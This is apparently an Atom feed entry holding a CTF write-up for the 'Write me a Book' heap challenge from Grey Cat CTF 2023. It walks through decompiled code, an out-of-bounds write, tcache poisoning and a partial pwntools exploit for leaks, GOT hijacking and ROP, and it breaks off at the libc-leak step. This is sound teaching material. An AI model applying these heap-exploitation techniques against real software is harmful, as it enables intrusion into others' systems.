<?xml version="1.0" encoding="utf-8"?> 
<feed xmlns="http://www.w3.org/2005/Atom" xml:lang="en">
    <generator uri="https://gohugo.io/" version="0.92.2">Hugo</generator><title type="html"><![CDATA[heap on repr]]></title>
    
        <subtitle type="html"><![CDATA[pwn, RE, crypto stuff]]></subtitle>
    
    
    
            <link href="https://nasm.re/tags/heap/" rel="alternate" type="text/html" title="HTML" />
            <link href="https://nasm.re/tags/heap/feed.xml" rel="self" type="application/atom+xml" title="Atom" />
    <updated>2023-06-14T00:13:28+02:00</updated>
    
        <author>
            <name>nasm</name>
            
                <email>nasm@pm.me</email>
            </author>
        
    <id>https://nasm.re/tags/heap/</id>
        
        <entry>
            <title type="html"><![CDATA[[Grey Cat CTF Quals 2023 - pwn] Write me a Book]]></title>
            <link href="https://nasm.re/posts/writemeabook/?utm_source=atom_feed" rel="alternate" type="text/html"  hreflang="en" />
            <id>https://nasm.re/posts/writemeabook/</id>
            
            <published>2023-05-21T00:00:00+00:00</published>
            <updated>2023-05-21T00:00:00+00:00</updated>
            
            
            <content type="html"><![CDATA[<div class="gblog-post__anchorwrap">
    <h1 id="write-me-a-book">
        Write me a book
        <a data-clipboard-text="https://nasm.re/posts/writemeabook/#write-me-a-book" class="gblog-post__anchor gblog-post__anchor--right clip" aria-label="Anchor Write me a book" href="#write-me-a-book">
            <svg class="icon gblog_link"><use xlink:href="#gblog_link"></use></svg>
        </a>
    </h1>
</div>
<blockquote>
<p>Write me a Book
349</p>
<p>Give back to the library! Share your thoughts and experiences!</p>
<p>The flag can be found in /flag</p>
<p>Elma</p>
<p>nc 34.124.157.94 12346</p>
</blockquote>
<p>Write me a book is a heap challenge I did during the <a
  class="gblog-markdown__link"
  href="https://nusgreyhats.org/"
  
  >Grey Cat The Flag 2023 Qualifiers</a
>. You can find the tasks and the exploit <a
  class="gblog-markdown__link"
  href="https://github.com/ret2school/ctf/tree/master/2023/greyctf/pwn/writemeabook"
  
  >here</a
>.</p>
<div class="gblog-post__anchorwrap">
    <h2 id="tldr">
        TL;DR
        <a data-clipboard-text="https://nasm.re/posts/writemeabook/#tldr" class="gblog-post__anchor gblog-post__anchor--right clip" aria-label="Anchor TL;DR" href="#tldr">
            <svg class="icon gblog_link"><use xlink:href="#gblog_link"></use></svg>
        </a>
    </h2>
</div>
<p>To manage to read the flag we have to:</p>
<ul>
<li>create overlapping chunks due to an oob write vulnerability in <code>rewrite_books</code></li>
<li>tcache poisoning thanks to the overlapping chunks</li>
<li>Overwrite the first entry of <code>@books</code> to then be able to rewrite 4 entries of <code>@books</code> by setting a large size.</li>
<li>With the read / write primitives of <code>@books</code> we leak <code>&amp;stdout@glibc</code> and <code>environ</code>, this way getting a libc and stack leak.</li>
<li>This way we can simply ROP over a given stackframe.</li>
</ul>
<div class="gblog-post__anchorwrap">
    <h2 id="general-overview">
        General overview
        <a data-clipboard-text="https://nasm.re/posts/writemeabook/#general-overview" class="gblog-post__anchor gblog-post__anchor--right clip" aria-label="Anchor General overview" href="#general-overview">
            <svg class="icon gblog_link"><use xlink:href="#gblog_link"></use></svg>
        </a>
    </h2>
</div>
<p>Let&rsquo;s take a look at the protections and the version of the libc:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-sh" data-lang="sh">$ ./libc.so.6 
GNU C Library <span class="o">(</span>Ubuntu GLIBC 2.35-0ubuntu3.1<span class="o">)</span> stable release version 2.35.
Copyright <span class="o">(</span>C<span class="o">)</span> <span class="m">2022</span> Free Software Foundation, Inc.
This is free software<span class="p">;</span> see the <span class="nb">source</span> <span class="k">for</span> copying conditions.
There is NO warranty<span class="p">;</span> not even <span class="k">for</span> MERCHANTABILITY or FITNESS FOR A
PARTICULAR PURPOSE.
Compiled by GNU CC version 11.2.0.
libc ABIs: UNIQUE IFUNC ABSOLUTE
For bug reporting instructions, please see:
&lt;https://bugs.launchpad.net/ubuntu/+source/glibc/+bugs&gt;.
$ checksec --file ./libc.so.6 
<span class="o">[</span>*<span class="o">]</span> <span class="s1">&#39;/media/nasm/7044d811-e1cd-4997-97d5-c08072ce9497/ret2school/ctf/2023/greyctf/pwn/writemeabook/dist/libc.so.6&#39;</span>
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
</code></pre></div><p>So a very recent one with standards protections. Then let&rsquo;s take a look at the binary:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-sh" data-lang="sh">$ checksec --file chall
<span class="o">[</span>*<span class="o">]</span> <span class="s1">&#39;/media/nasm/7044d811-e1cd-4997-97d5-c08072ce9497/ret2school/ctf/2023/greyctf/pwn/writemeabook/dist/chall&#39;</span>
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      No PIE <span class="o">(</span>0x3fd000<span class="o">)</span>
    RUNPATH:  b<span class="s1">&#39;/home/nasm/Documents/pwn/greycat/writemeabook/dist&#39;</span>
$ seccomp-tools dump ./chall
Welcome to the library of hopes and dreams!

We heard about your journey...
and we want you to share about your experiences!

What would you like your author signature to be?
&gt; aa

Great! We would like you to write no more than <span class="m">10</span> books :<span class="o">)</span>
Please feel at home.
 line  CODE  JT   JF      <span class="nv">K</span>
<span class="o">=================================</span>
 0000: 0x20 0x00 0x00 0x00000004  <span class="nv">A</span> <span class="o">=</span> arch
 0001: 0x15 0x00 0x09 0xc000003e  <span class="k">if</span> <span class="o">(</span>A !<span class="o">=</span> ARCH_X86_64<span class="o">)</span> goto <span class="m">0011</span>
 0002: 0x20 0x00 0x00 0x00000000  <span class="nv">A</span> <span class="o">=</span> sys_number
 0003: 0x35 0x00 0x01 0x40000000  <span class="k">if</span> <span class="o">(</span>A &lt; 0x40000000<span class="o">)</span> goto <span class="m">0005</span>
 0004: 0x15 0x00 0x06 0xffffffff  <span class="k">if</span> <span class="o">(</span>A !<span class="o">=</span> 0xffffffff<span class="o">)</span> goto <span class="m">0011</span>
 0005: 0x15 0x04 0x00 0x00000000  <span class="k">if</span> <span class="o">(</span><span class="nv">A</span> <span class="o">==</span> <span class="nb">read</span><span class="o">)</span> goto <span class="m">0010</span>
 0006: 0x15 0x03 0x00 0x00000001  <span class="k">if</span> <span class="o">(</span><span class="nv">A</span> <span class="o">==</span> write<span class="o">)</span> goto <span class="m">0010</span>
 0007: 0x15 0x02 0x00 0x00000002  <span class="k">if</span> <span class="o">(</span><span class="nv">A</span> <span class="o">==</span> open<span class="o">)</span> goto <span class="m">0010</span>
 0008: 0x15 0x01 0x00 0x0000003c  <span class="k">if</span> <span class="o">(</span><span class="nv">A</span> <span class="o">==</span> <span class="nb">exit</span><span class="o">)</span> goto <span class="m">0010</span>
 0009: 0x15 0x00 0x01 0x000000e7  <span class="k">if</span> <span class="o">(</span>A !<span class="o">=</span> exit_group<span class="o">)</span> goto <span class="m">0011</span>
 0010: 0x06 0x00 0x00 0x7fff0000  <span class="k">return</span> ALLOW
 0011: 0x06 0x00 0x00 0x00000000  <span class="k">return</span> KILL
</code></pre></div><p>The binary isn&rsquo;t PIE based and does have a seccomp that allows only <code>read</code>, <code>write</code>, <code>open</code> and <code>exit</code>. Which will make the exploitation harder (but not that much).</p>
<div class="gblog-post__anchorwrap">
    <h2 id="code-review">
        Code review
        <a data-clipboard-text="https://nasm.re/posts/writemeabook/#code-review" class="gblog-post__anchor gblog-post__anchor--right clip" aria-label="Anchor Code review" href="#code-review">
            <svg class="icon gblog_link"><use xlink:href="#gblog_link"></use></svg>
        </a>
    </h2>
</div>
<p>The <code>main</code> looks like this:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="kt">int</span> <span class="kr">__cdecl</span> <span class="nf">main</span><span class="p">(</span><span class="kt">int</span> <span class="n">argc</span><span class="p">,</span> <span class="k">const</span> <span class="kt">char</span> <span class="o">**</span><span class="n">argv</span><span class="p">,</span> <span class="k">const</span> <span class="kt">char</span> <span class="o">**</span><span class="n">envp</span><span class="p">)</span>
<span class="p">{</span>
  <span class="n">setup</span><span class="p">(</span><span class="n">argc</span><span class="p">,</span> <span class="n">argv</span><span class="p">,</span> <span class="n">envp</span><span class="p">);</span>
  <span class="n">puts</span><span class="p">(</span><span class="s">&#34;Welcome to the library of hopes and dreams!&#34;</span><span class="p">);</span>
  <span class="n">puts</span><span class="p">(</span><span class="s">&#34;</span><span class="se">\n</span><span class="s">We heard about your journey...&#34;</span><span class="p">);</span>
  <span class="n">puts</span><span class="p">(</span><span class="s">&#34;and we want you to share about your experiences!&#34;</span><span class="p">);</span>
  <span class="n">puts</span><span class="p">(</span><span class="s">&#34;</span><span class="se">\n</span><span class="s">What would you like your author signature to be?&#34;</span><span class="p">);</span>
  <span class="n">printf</span><span class="p">(</span><span class="s">&#34;&gt; &#34;</span><span class="p">);</span>
  <span class="n">LODWORD</span><span class="p">(</span><span class="n">author_signature</span><span class="p">)</span> <span class="o">=</span> <span class="err">&#39;</span> <span class="n">yb</span><span class="err">&#39;</span><span class="p">;</span>
  <span class="n">__isoc99_scanf</span><span class="p">(</span><span class="s">&#34;%12s&#34;</span><span class="p">,</span> <span class="p">(</span><span class="kt">char</span> <span class="o">*</span><span class="p">)</span><span class="o">&amp;</span><span class="n">author_signature</span> <span class="o">+</span> <span class="mi">3</span><span class="p">);</span>
  <span class="n">puts</span><span class="p">(</span><span class="s">&#34;</span><span class="se">\n</span><span class="s">Great! We would like you to write no more than 10 books :)&#34;</span><span class="p">);</span>
  <span class="n">puts</span><span class="p">(</span><span class="s">&#34;Please feel at home.&#34;</span><span class="p">);</span>
  <span class="n">secure_library</span><span class="p">();</span>
  <span class="n">write_books</span><span class="p">();</span>
  <span class="k">return</span> <span class="n">puts</span><span class="p">(</span><span class="s">&#34;Goodbye!&#34;</span><span class="p">);</span>
<span class="p">}</span>
</code></pre></div><p>We have to give a signature (12 bytes max) sorted in <code>author_signatures</code>, then the program is allocating a lot of chunks in <code>secure_library</code>. Finally it calls <code>write_books</code> which contains the main logic:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="kt">unsigned</span> <span class="kr">__int64</span> <span class="nf">write_books</span><span class="p">()</span>
<span class="p">{</span>
  <span class="kt">int</span> <span class="n">choice</span><span class="p">;</span> <span class="c1">// [rsp+0h] [rbp-10h] BYREF
</span><span class="c1"></span>  <span class="kt">int</span> <span class="n">fav_num</span><span class="p">;</span> <span class="c1">// [rsp+4h] [rbp-Ch] BYREF
</span><span class="c1"></span>  <span class="kt">unsigned</span> <span class="kr">__int64</span> <span class="n">v3</span><span class="p">;</span> <span class="c1">// [rsp+8h] [rbp-8h]
</span><span class="c1"></span>
  <span class="n">v3</span> <span class="o">=</span> <span class="n">__readfsqword</span><span class="p">(</span><span class="mh">0x28u</span><span class="p">);</span>
  <span class="k">while</span> <span class="p">(</span> <span class="mi">1</span> <span class="p">)</span>
  <span class="p">{</span>
    <span class="k">while</span> <span class="p">(</span> <span class="mi">1</span> <span class="p">)</span>
    <span class="p">{</span>
      <span class="n">print_menu</span><span class="p">();</span>
      <span class="n">__isoc99_scanf</span><span class="p">(</span><span class="s">&#34;%d&#34;</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">choice</span><span class="p">);</span>
      <span class="n">getchar</span><span class="p">();</span>
      <span class="k">if</span> <span class="p">(</span> <span class="n">choice</span> <span class="o">!=</span> <span class="mi">1337</span> <span class="p">)</span>
        <span class="k">break</span><span class="p">;</span>
      <span class="k">if</span> <span class="p">(</span> <span class="o">!</span><span class="n">secret_msg</span> <span class="p">)</span>
      <span class="p">{</span>
        <span class="n">printf</span><span class="p">(</span><span class="s">&#34;What is your favourite number? &#34;</span><span class="p">);</span>
        <span class="n">__isoc99_scanf</span><span class="p">(</span><span class="s">&#34;%d&#34;</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">fav_num</span><span class="p">);</span>
        <span class="k">if</span> <span class="p">(</span> <span class="n">fav_num</span> <span class="o">&gt;</span> <span class="mi">0</span> <span class="o">&amp;&amp;</span> <span class="n">fav_num</span> <span class="o">&lt;=</span> <span class="mi">10</span> <span class="o">&amp;&amp;</span> <span class="n">slot</span><span class="p">[</span><span class="mi">2</span> <span class="o">*</span> <span class="n">fav_num</span> <span class="o">-</span> <span class="mi">2</span><span class="p">]</span> <span class="p">)</span>
          <span class="n">printf</span><span class="p">(</span><span class="s">&#34;You found a secret message: %p</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">,</span> <span class="n">slot</span><span class="p">[</span><span class="mi">2</span> <span class="o">*</span> <span class="n">fav_num</span> <span class="o">-</span> <span class="mi">2</span><span class="p">]);</span>
        <span class="n">secret_msg</span> <span class="o">=</span> <span class="mi">1</span><span class="p">;</span>
      <span class="p">}</span>
<span class="nl">LABEL_19</span><span class="p">:</span>
      <span class="n">puts</span><span class="p">(</span><span class="s">&#34;Invalid choice.&#34;</span><span class="p">);</span>
    <span class="p">}</span>
    <span class="k">if</span> <span class="p">(</span> <span class="n">choice</span> <span class="o">&gt;</span> <span class="mi">1337</span> <span class="p">)</span>
      <span class="k">goto</span> <span class="n">LABEL_19</span><span class="p">;</span>
    <span class="k">if</span> <span class="p">(</span> <span class="n">choice</span> <span class="o">==</span> <span class="mi">4</span> <span class="p">)</span>
      <span class="k">return</span> <span class="n">v3</span> <span class="o">-</span> <span class="n">__readfsqword</span><span class="p">(</span><span class="mh">0x28u</span><span class="p">);</span>
    <span class="k">if</span> <span class="p">(</span> <span class="n">choice</span> <span class="o">&gt;</span> <span class="mi">4</span> <span class="p">)</span>
      <span class="k">goto</span> <span class="n">LABEL_19</span><span class="p">;</span>
    <span class="k">switch</span> <span class="p">(</span> <span class="n">choice</span> <span class="p">)</span>
    <span class="p">{</span>
      <span class="k">case</span> <span class="mi">3</span><span class="o">:</span>
        <span class="n">throw_book</span><span class="p">();</span>
        <span class="k">break</span><span class="p">;</span>
      <span class="k">case</span> <span class="mi">1</span><span class="o">:</span>
        <span class="n">write_book</span><span class="p">();</span>
        <span class="k">break</span><span class="p">;</span>
      <span class="k">case</span> <span class="mi">2</span><span class="o">:</span>
        <span class="n">rewrite_book</span><span class="p">();</span>
        <span class="k">break</span><span class="p">;</span>
      <span class="k">default</span><span class="o">:</span>
        <span class="k">goto</span> <span class="n">LABEL_19</span><span class="p">;</span>
    <span class="p">}</span>
  <span class="p">}</span>
<span class="p">}</span>
</code></pre></div><p>There are basically three handlers:</p>
<ul>
<li><code>1337</code>, we can leak only one time the address of a given allocated chunk.</li>
<li><code>4</code> returns.</li>
<li><code>3</code> free a chunk.</li>
<li><code>1</code> add a book.</li>
<li><code>2</code> edit a book.</li>
</ul>
<p>Let&rsquo;s take a quick look at each handler, first the free handler:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="kt">unsigned</span> <span class="kr">__int64</span> <span class="nf">throw_book</span><span class="p">()</span>
<span class="p">{</span>
  <span class="kt">int</span> <span class="n">v1</span><span class="p">;</span> <span class="c1">// [rsp+4h] [rbp-Ch] BYREF
</span><span class="c1"></span>  <span class="kt">unsigned</span> <span class="kr">__int64</span> <span class="n">v2</span><span class="p">;</span> <span class="c1">// [rsp+8h] [rbp-8h]
</span><span class="c1"></span>
  <span class="n">v2</span> <span class="o">=</span> <span class="n">__readfsqword</span><span class="p">(</span><span class="mh">0x28u</span><span class="p">);</span>
  <span class="n">puts</span><span class="p">(</span><span class="s">&#34;</span><span class="se">\n</span><span class="s">At which index of the shelf would you like to throw your book?&#34;</span><span class="p">);</span>
  <span class="n">printf</span><span class="p">(</span><span class="s">&#34;Index: &#34;</span><span class="p">);</span>
  <span class="n">__isoc99_scanf</span><span class="p">(</span><span class="s">&#34;%d&#34;</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">v1</span><span class="p">);</span>
  <span class="n">getchar</span><span class="p">();</span>
  <span class="k">if</span> <span class="p">(</span> <span class="n">v1</span> <span class="o">&gt;</span> <span class="mi">0</span> <span class="o">&amp;&amp;</span> <span class="n">v1</span> <span class="o">&lt;=</span> <span class="mi">10</span> <span class="o">&amp;&amp;</span> <span class="n">slot</span><span class="p">[</span><span class="mi">2</span> <span class="o">*</span> <span class="n">v1</span> <span class="o">-</span> <span class="mi">2</span><span class="p">]</span> <span class="p">)</span>
  <span class="p">{</span>
    <span class="n">free</span><span class="p">(</span><span class="n">slot</span><span class="p">[</span><span class="mi">2</span> <span class="o">*</span> <span class="o">--</span><span class="n">v1</span><span class="p">]);</span>
    <span class="n">slot</span><span class="p">[</span><span class="mi">2</span> <span class="o">*</span> <span class="n">v1</span><span class="p">]</span> <span class="o">=</span> <span class="mi">0LL</span><span class="p">;</span>
    <span class="n">puts</span><span class="p">(</span><span class="s">&#34;Your book has been thrown!</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">);</span>
  <span class="p">}</span>
  <span class="k">else</span>
  <span class="p">{</span>
    <span class="n">puts</span><span class="p">(</span><span class="s">&#34;Invaid slot!&#34;</span><span class="p">);</span>
  <span class="p">}</span>
  <span class="k">return</span> <span class="n">v2</span> <span class="o">-</span> <span class="n">__readfsqword</span><span class="p">(</span><span class="mh">0x28u</span><span class="p">);</span>
<span class="p">}</span>
</code></pre></div><p>It only checks is the entry exists and if the index is in the right range. if it does it frees the entry and zeroes it.</p>
<p>Then, the add handler:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="kt">unsigned</span> <span class="kr">__int64</span> <span class="nf">write_book</span><span class="p">()</span>
<span class="p">{</span>
  <span class="kt">int</span> <span class="n">idx2</span><span class="p">;</span> <span class="c1">// ebx
</span><span class="c1"></span>  <span class="n">_QWORD</span> <span class="o">*</span><span class="n">v1</span><span class="p">;</span> <span class="c1">// rcx
</span><span class="c1"></span>  <span class="kr">__int64</span> <span class="n">v2</span><span class="p">;</span> <span class="c1">// rdx
</span><span class="c1"></span>  <span class="kt">int</span> <span class="n">idx</span><span class="p">;</span> <span class="c1">// [rsp+4h] [rbp-4Ch] BYREF
</span><span class="c1"></span>  <span class="n">size_t</span> <span class="n">size</span><span class="p">;</span> <span class="c1">// [rsp+8h] [rbp-48h]
</span><span class="c1"></span>  <span class="kt">char</span> <span class="n">buf</span><span class="p">[</span><span class="mi">32</span><span class="p">];</span> <span class="c1">// [rsp+10h] [rbp-40h] BYREF
</span><span class="c1"></span>  <span class="kt">char</span> <span class="n">v7</span><span class="p">;</span> <span class="c1">// [rsp+30h] [rbp-20h]
</span><span class="c1"></span>  <span class="kt">unsigned</span> <span class="kr">__int64</span> <span class="n">v8</span><span class="p">;</span> <span class="c1">// [rsp+38h] [rbp-18h]
</span><span class="c1"></span>
  <span class="n">v8</span> <span class="o">=</span> <span class="n">__readfsqword</span><span class="p">(</span><span class="mh">0x28u</span><span class="p">);</span>
  <span class="n">puts</span><span class="p">(</span><span class="s">&#34;</span><span class="se">\n</span><span class="s">At which index of the shelf would you like to insert your book?&#34;</span><span class="p">);</span>
  <span class="n">printf</span><span class="p">(</span><span class="s">&#34;Index: &#34;</span><span class="p">);</span>
  <span class="n">__isoc99_scanf</span><span class="p">(</span><span class="s">&#34;%d&#34;</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">idx</span><span class="p">);</span>
  <span class="n">getchar</span><span class="p">();</span>
  <span class="k">if</span> <span class="p">(</span> <span class="n">idx</span> <span class="o">&lt;=</span> <span class="mi">0</span> <span class="o">||</span> <span class="n">idx</span> <span class="o">&gt;</span> <span class="mi">10</span> <span class="o">||</span> <span class="n">slot</span><span class="p">[</span><span class="mi">2</span> <span class="o">*</span> <span class="n">idx</span> <span class="o">-</span> <span class="mi">2</span><span class="p">]</span> <span class="p">)</span>
  <span class="p">{</span>
    <span class="n">puts</span><span class="p">(</span><span class="s">&#34;Invaid slot!&#34;</span><span class="p">);</span>
  <span class="p">}</span>
  <span class="k">else</span>
  <span class="p">{</span>
    <span class="o">--</span><span class="n">idx</span><span class="p">;</span>
    <span class="n">memset</span><span class="p">(</span><span class="n">buf</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">buf</span><span class="p">));</span>
    <span class="n">v7</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
    <span class="n">puts</span><span class="p">(</span><span class="s">&#34;Write me a book no more than 32 characters long!&#34;</span><span class="p">);</span>
    <span class="n">size</span> <span class="o">=</span> <span class="n">read</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="n">buf</span><span class="p">,</span> <span class="mh">0x20uLL</span><span class="p">)</span> <span class="o">+</span> <span class="mh">0x10</span><span class="p">;</span>
    <span class="n">idx2</span> <span class="o">=</span> <span class="n">idx</span><span class="p">;</span>
    <span class="n">slot</span><span class="p">[</span><span class="mi">2</span> <span class="o">*</span> <span class="n">idx2</span><span class="p">]</span> <span class="o">=</span> <span class="n">malloc</span><span class="p">(</span><span class="n">size</span><span class="p">);</span>
    <span class="n">memcpy</span><span class="p">(</span><span class="n">slot</span><span class="p">[</span><span class="mi">2</span> <span class="o">*</span> <span class="n">idx</span><span class="p">],</span> <span class="n">buf</span><span class="p">,</span> <span class="n">size</span> <span class="o">-</span> <span class="mh">0x10</span><span class="p">);</span>
    <span class="n">v1</span> <span class="o">=</span> <span class="p">(</span><span class="kt">char</span> <span class="o">*</span><span class="p">)</span><span class="n">slot</span><span class="p">[</span><span class="mi">2</span> <span class="o">*</span> <span class="n">idx</span><span class="p">]</span> <span class="o">+</span> <span class="n">size</span> <span class="o">-</span> <span class="mh">0x10</span><span class="p">;</span>
    <span class="n">v2</span> <span class="o">=</span> <span class="n">qword_4040D8</span><span class="p">;</span>
    <span class="o">*</span><span class="n">v1</span> <span class="o">=</span> <span class="o">*</span><span class="p">(</span><span class="n">_QWORD</span> <span class="o">*</span><span class="p">)</span><span class="n">author_signature</span><span class="p">;</span>
    <span class="n">v1</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span> <span class="o">=</span> <span class="n">v2</span><span class="p">;</span>
    <span class="n">books</span><span class="p">[</span><span class="n">idx</span><span class="p">].</span><span class="n">size</span> <span class="o">=</span> <span class="n">size</span><span class="p">;</span>
    <span class="n">puts</span><span class="p">(</span><span class="s">&#34;Your book has been published!</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">);</span>
  <span class="p">}</span>
  <span class="k">return</span> <span class="n">v8</span> <span class="o">-</span> <span class="n">__readfsqword</span><span class="p">(</span><span class="mh">0x28u</span><span class="p">);</span>
<span class="p">}</span>
</code></pre></div><p>We can allocate a chunk between <code>0x10</code> and <code>0x20 + 0x10</code> bytes and after we wrote in it the signature initially choose at the begin of the execution is put right after the end of the input.</p>
<p>Finally comes the handler where lies the vuln, the edit handler:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="kt">unsigned</span> <span class="kr">__int64</span> <span class="nf">rewrite_book</span><span class="p">()</span>
<span class="p">{</span>
  <span class="n">_QWORD</span> <span class="o">*</span><span class="n">v0</span><span class="p">;</span> <span class="c1">// rcx
</span><span class="c1"></span>  <span class="kr">__int64</span> <span class="n">v1</span><span class="p">;</span> <span class="c1">// rdx
</span><span class="c1"></span>  <span class="kt">int</span> <span class="n">idx</span><span class="p">;</span> <span class="c1">// [rsp+Ch] [rbp-14h] BYREF
</span><span class="c1"></span>  <span class="n">ssize_t</span> <span class="n">v4</span><span class="p">;</span> <span class="c1">// [rsp+10h] [rbp-10h]
</span><span class="c1"></span>  <span class="kt">unsigned</span> <span class="kr">__int64</span> <span class="n">v5</span><span class="p">;</span> <span class="c1">// [rsp+18h] [rbp-8h]
</span><span class="c1"></span>
  <span class="n">v5</span> <span class="o">=</span> <span class="n">__readfsqword</span><span class="p">(</span><span class="mh">0x28u</span><span class="p">);</span>
  <span class="n">puts</span><span class="p">(</span><span class="s">&#34;</span><span class="se">\n</span><span class="s">At which index of the shelf would you like to rewrite your book?&#34;</span><span class="p">);</span>
  <span class="n">printf</span><span class="p">(</span><span class="s">&#34;Index: &#34;</span><span class="p">);</span>
  <span class="n">__isoc99_scanf</span><span class="p">(</span><span class="s">&#34;%d&#34;</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">idx</span><span class="p">);</span>
  <span class="n">getchar</span><span class="p">();</span>
  <span class="k">if</span> <span class="p">(</span> <span class="n">idx</span> <span class="o">&gt;</span> <span class="mi">0</span> <span class="o">&amp;&amp;</span> <span class="n">idx</span> <span class="o">&lt;=</span> <span class="mi">10</span> <span class="o">&amp;&amp;</span> <span class="n">slot</span><span class="p">[</span><span class="mi">2</span> <span class="o">*</span> <span class="n">idx</span> <span class="o">-</span> <span class="mi">2</span><span class="p">]</span> <span class="p">)</span>
  <span class="p">{</span>
    <span class="o">--</span><span class="n">idx</span><span class="p">;</span>
    <span class="n">puts</span><span class="p">(</span><span class="s">&#34;Write me the new contents of your book that is no longer than what it was before.&#34;</span><span class="p">);</span>
    <span class="n">v4</span> <span class="o">=</span> <span class="n">read</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="n">slot</span><span class="p">[</span><span class="mi">2</span> <span class="o">*</span> <span class="n">idx</span><span class="p">],</span> <span class="n">books</span><span class="p">[</span><span class="n">idx</span><span class="p">].</span><span class="n">size</span><span class="p">);</span>
    <span class="n">v0</span> <span class="o">=</span> <span class="p">(</span><span class="kr">__int64</span> <span class="o">*</span><span class="p">)((</span><span class="kt">char</span> <span class="o">*</span><span class="p">)</span><span class="n">slot</span><span class="p">[</span><span class="mi">2</span> <span class="o">*</span> <span class="n">idx</span><span class="p">]</span><span class="o">-&gt;</span><span class="n">buf</span> <span class="o">+</span> <span class="n">v4</span><span class="p">);</span>
    <span class="n">v1</span> <span class="o">=</span> <span class="n">qword_4040D8</span><span class="p">;</span>
    <span class="o">*</span><span class="n">v0</span> <span class="o">=</span> <span class="n">author_signature</span><span class="p">;</span>
    <span class="n">v0</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span> <span class="o">=</span> <span class="n">v1</span><span class="p">;</span>
    <span class="n">puts</span><span class="p">(</span><span class="s">&#34;Your book has been rewritten!</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">);</span>
  <span class="p">}</span>
  <span class="k">else</span>
  <span class="p">{</span>
    <span class="n">puts</span><span class="p">(</span><span class="s">&#34;Invaid slot!&#34;</span><span class="p">);</span>
  <span class="p">}</span>
  <span class="k">return</span> <span class="n">v5</span> <span class="o">-</span> <span class="n">__readfsqword</span><span class="p">(</span><span class="mh">0x28u</span><span class="p">);</span>
<span class="p">}</span>
</code></pre></div><p>As you can read there is an out of bound write if we input <code>books[idx].size</code> bytes, indeed given the chunk stores only <code>books[idx].size</code> bytes the signature writes over the current chunk. And most of the time on the header (and especially the size) of the next chunk allocated in memory resulting an overlapping chunk.</p>
<div class="gblog-post__anchorwrap">
    <h2 id="exploitation">
        Exploitation
        <a data-clipboard-text="https://nasm.re/posts/writemeabook/#exploitation" class="gblog-post__anchor gblog-post__anchor--right clip" aria-label="Anchor Exploitation" href="#exploitation">
            <svg class="icon gblog_link"><use xlink:href="#gblog_link"></use></svg>
        </a>
    </h2>
</div>
<p>Given we can get overlapping chunks we&rsquo;re able to do tcache poisoning on the <code>0x40</code> tcachebin (to deeply understand why I advice you to read the exploit and to run it into gdb). At this point we can simply write the first entry of <code>@books</code> that is stored at a fixed memory area within the binary (no PIE). In this new entry we could write a pointer to itself but with a large size in order to be able to write several entries of <code>@books</code>. When it is done we could write these entries:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-py" data-lang="py">    <span class="n">edit</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="n">pwn</span><span class="o">.</span><span class="n">flat</span><span class="p">([</span>
            <span class="c1"># 1==</span>
            <span class="mh">0xff</span><span class="p">,</span> <span class="c1"># sz</span>
            <span class="n">exe</span><span class="o">.</span><span class="n">sym</span><span class="o">.</span><span class="n">stdout</span><span class="p">,</span> <span class="c1"># to leak libc</span>
            <span class="c1"># 2==</span>
            <span class="mh">0x8</span><span class="p">,</span> <span class="c1"># sz</span>
            <span class="n">exe</span><span class="o">.</span><span class="n">got</span><span class="o">.</span><span class="n">free</span><span class="p">,</span> <span class="c1"># to do GOT hiijacking</span>
            <span class="c1"># 3==</span>
            <span class="mh">0x8</span><span class="p">,</span> <span class="c1"># sz</span>
            <span class="n">exe</span><span class="o">.</span><span class="n">sym</span><span class="o">.</span><span class="n">secret_msg</span><span class="p">,</span> <span class="c1"># to be able to print an entry of @books</span>
            <span class="c1"># 4==</span>
            <span class="mh">0xff</span><span class="p">,</span> <span class="c1"># sz</span>
            <span class="n">exe</span><span class="o">.</span><span class="n">sym</span><span class="o">.</span><span class="n">books</span> <span class="c1"># ptr to itself to be able to rewrite the entries when we need to do so</span>
        <span class="p">]</span> <span class="o">+</span> <span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">*</span> <span class="mh">0x60</span><span class="p">,</span> <span class="n">filler</span> <span class="o">=</span> <span class="sa">b</span><span class="s2">&#34;</span><span class="se">\x00</span><span class="s2">&#34;</span><span class="p">))</span>
</code></pre></div><p>This way we can easily leak libc.</p>
<div class="gblog-post__anchorwrap">
    <h2 id="leaking-libc">
        Leaking libc
        <a data-clipboard-text="https://nasm.re/posts/writemeabook/#leaking-libc" class="gblog-post__anchor gblog-post__anchor--right clip" aria-label="Anchor Leaking libc" href="#leaking-libc">
            <svg class="icon gblog_link"><use xlink:href="#gblog_link"></use></svg>
        </a>
    </h2>
</div>
